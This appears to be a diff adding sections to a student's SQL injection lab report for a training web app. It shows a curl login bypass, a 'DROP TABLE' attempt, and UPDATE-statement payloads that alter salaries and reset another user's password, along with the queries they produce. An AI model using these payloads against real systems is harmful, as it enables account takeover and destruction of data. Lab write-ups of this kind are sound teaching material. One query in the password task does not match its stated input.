@@ -37,7 +37,107 @@ As expected, we were able to log in with the administrator account and thus obta
 
 ### Task 2.2 - SQL Injection Attack from command line
 
+This time we carry out the attack through a GET request. An example of a request to this server in a command line would be:
 
+```bash
+curl "www.seed-server.com/unsafe_home.php?username=USER&Password=PASS"
+```
+
+With the same input from the previous section, this time encrypted using the conventions (%27 = ' and %23 = #), we obtained the following malicious command:
+
+```bash
+curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="
+```
+
+With this, we obtained the HTML code of the entire page that contained users' personal data
+
+![image_task2.2](image-10.png)
+
+### Task 2.3 - Append a new SQL statement
+
+We can add new SQL commands using ";". To do this, we modified our initial malicious input so that it had a side-effect on the server. For example, delete the credentials table:
+
+```sql
+admin'; DROP TABLE IF EXISTS credentials; #
+```
+
+However, the operation was not executed due to a database error:
+
+![image_task2.3](image-11.png)
+
+## Task 3 - SQL Injection Attack on UPDATE Statement
+
+### Task 3.1 - Modify your own salary
+
+After logging in with a system account (for example username = Alice, password = 11), we had access to a page to edit personal data. This is managed from the available file `unsafe_edit_backend.php`, which contains a query also dynamically formed with unsanitized strings from user input. <br>
+Our attack consists of using the "phone number" field. Using the same technique as in previous topics, we obtained the following code that can manipulate the user's salary:
+
+```sql
+933667378',Salary='9999999
+```
+
+Note that the single quote (') before the salary value is important to complete the last statement before WHERE. In the end, the server executed the following code:
+
+```sql
+UPDATE credential SET
+nickname='$input_nickname',
+email='$input_email',
+address='$input_address',
+Password='$hashed_pwd',
+PhoneNumber='933667378',Salary='9999999' WHERE ID=$id;
+```
+
+As expected, the salary variable was also changed to the chosen value:
+
+![image_task3.1](image-12.png)
+
+### Task 3.2 - Modify other people’ salary
+
+To change the value of another user's salary, we use a technique similar to the previous one. However, we created a different WHERE clause and commented out the one that was in the system so as not to interfere with the search:
+
+```sql
+933667378',Salary='1' WHERE Name='Boby'#
+```
+
+With this input, the server executed the following code:
+
+```sql
+UPDATE credential SET
+nickname='$input_nickname',
+email='$input_email',
+address='$input_address',
+Password='$hashed_pwd',
+PhoneNumber='933667378',Salary='1' WHERE Name='Boby'# WHERE ID=$id;
+```
+
+Here we can see the value of Boby's salary after the attack:
+
+![image_task3.2](image-13.png)
+
+
+### Task 3.3 - Modify other people’ password
+
+To change another user's password, we use a technique similar to the previous one. This time the value to be modified was previously encrypted with SHA1 encryption. For example, for the new password `aliceeboss`, the hash is `82acd69fd30df22ef58659d6e483ae39fa56324d`.
+
+
+```sql
+912345678', password='82acd69fd30df22ef58659d6e483ae39fa56324d' WHERE name='Boby'#
+```
+
+With this input, the server executed the following code:
+
+```sql
+UPDATE credential SET
+nickname='$input_nickname',
+email='$input_email',
+address='$input_address',
+Password='$hashed_pwd',
+PhoneNumber='933667378', password='82acd69fd30df22ef58659d6e483ae39fa56324d' WHERE name='Boby'# WHERE ID=$id;
+```
+
+With the new password changed, we were able to log into Boby's account:
+
+![image_task3.3](image-14.png)
 
 
 # CTF - Control The Flag
